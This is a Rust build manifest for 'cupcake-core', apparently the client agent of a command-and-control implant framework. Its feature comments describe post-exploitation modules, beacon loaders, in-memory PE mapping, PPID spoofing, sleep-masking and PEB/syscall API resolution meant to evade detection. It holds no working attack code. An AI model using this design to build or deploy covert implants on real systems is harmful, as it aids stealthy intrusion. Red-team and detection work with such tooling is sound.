[package]
name = "cupcake-core"
version = "0.1.0"
edition = "2021"

[lib]
name = "cupcake_core"
crate-type = ["cdylib", "rlib"]
# Doc-tests still reference the old crate name `c2_client_agent`; unit tests cover shipped paths.
doctest = false

[features]
# Default product build: WebSocket + standard post-ex (NO stealth-adv / sleep-mask).
default = ["ws", "standard"]

# --- Transports (Builder picks one) ---
ws = ["dep:tokio-tungstenite", "dep:url"]
ws-tls = ["ws", "tokio-tungstenite/rustls-tls-native-roots"]
tcp = []
tcp_bind = []
dns = ["dep:trust-dns-resolver"]

# --- Capability tiers ---
# beacon defined below with mem-map
# minimal: REVERSE product default — daily ops built-in + loader for heavy L2
#   built-in: hybrid shell / PTY / fs / process
#   NOT built-in: socks / plugin / bof / dotnet (module or forward/standard)
# Web UI PTY uses Yamux stream 0x01 → requires `pty`.
minimal = ["post-ex", "pty", "encoding-support", "module-loader", "isolated-exec", "mem-map"]
# standard: FORWARD / full post-ex monolith — process injection permanently removed
standard = ["post-ex", "pty", "socks", "plugin", "bof", "dotnet", "encoding-support", "logging", "rt-multi", "module-loader", "isolated-exec", "mem-map"]
# full: standard + high-signature stealth patches
full = ["standard", "stealth-adv"]
# beacon thin Stage0: loader + mem-map (no post-ex)
beacon = ["module-loader", "mem-map"]

# post-ex: fs / process / executor / hybrid shell (daily ops)
post-ex = []
module-loader = []
# Manual-Map L2 PE (no temp DLL); LoadLibrary is fallback unless mem-map-strict
mem-map = []
# Refuse disk LoadLibrary fallback for L2 modules
mem-map-strict = ["mem-map"]
# PPID-spoofed sacrificial host for BOF/.NET (not same-process module)
isolated-exec = []

# Individual capability gates (true compile-time exclusion)
pty = []
socks = []
plugin = ["dep:lazy_static"]
# inject feature deleted — no process injection builds
bof = ["dep:lazy_static"]
dotnet = []
encoding-support = ["dep:encoding_rs"]
logging = ["dep:env_logger"]
rt-multi = ["tokio/rt-multi-thread"]

# Stealth options — OFF by default
stealth-adv = ["dep:lazy_static"]
sleep-mask = []

[dependencies]
# Single-thread runtime by default (smaller); standard enables rt-multi-thread
tokio = { version = "1.35", default-features = false, features = ["rt", "macros", "io-util", "net", "time", "sync", "process"] }
tokio-tungstenite = { version = "0.21", default-features = false, features = ["connect"], optional = true }
tokio-util = { version = "0.7", default-features = false, features = ["codec", "compat"] }
yamux = "0.10"
url = { version = "2.5", optional = true }
trust-dns-resolver = { version = "0.23", optional = true }
serde = { version = "1.0", default-features = false, features = ["derive", "std"] }
serde_json = { version = "1.0", default-features = false, features = ["std"] }
uuid = { version = "1.6", default-features = false }
sha2 = { version = "0.10", default-features = false }
thiserror = "1.0"
log = { version = "0.4", default-features = false }
env_logger = { version = "0.11", optional = true }
getrandom = { version = "0.2", features = ["std"] }
futures-util = { version = "0.3", default-features = false, features = ["std", "async-await", "sink"] }
encoding_rs = { version = "0.8", optional = true }
base64 = { version = "0.21", default-features = false, features = ["std"] }
async-trait = "0.1"
aes-gcm = { version = "0.10", default-features = false, features = ["aes", "alloc"] }
aes = { version = "0.8", default-features = false }
socket2 = { version = "0.6", default-features = false }
hex = { version = "0.4", default-features = false, features = ["std"] }
lazy_static = { version = "1.4", optional = true }

[target.'cfg(windows)'.dependencies]
# Prefer types/constants; sensitive APIs go through PEB/syscall paths.
# CreateProcess/attributes are PEB-resolved in native/spawn (no hard IAT from this crate).
# heapapi retained for optional sleep-mask HeapWalk types only.
winapi = { version = "0.3", features = [
    "winnt", "memoryapi", "handleapi",
    "errhandlingapi", "winbase", "winuser",
    "oleauto", "unknwnbase",
    "debugapi", "sysinfoapi", "lmjoin", "lmcons", "lmapibuf",
    "namedpipeapi", "ioapiset", "synchapi", "fileapi",
    "threadpoollegacyapiset", "psapi", "securitybaseapi",
    "wtypes", "winerror", "guiddef", "minwinbase", "heapapi",
    "processenv", "ntdef", "tlhelp32", "processthreadsapi", "libloaderapi"
] }
widestring = "1.0"

[target.'cfg(unix)'.dependencies]
libc = "0.2"
nix = { version = "0.27", features = ["process", "fs", "user"] }

[dev-dependencies]
proptest = "1.4"
mockall = "0.12"
tempfile = "3.8"
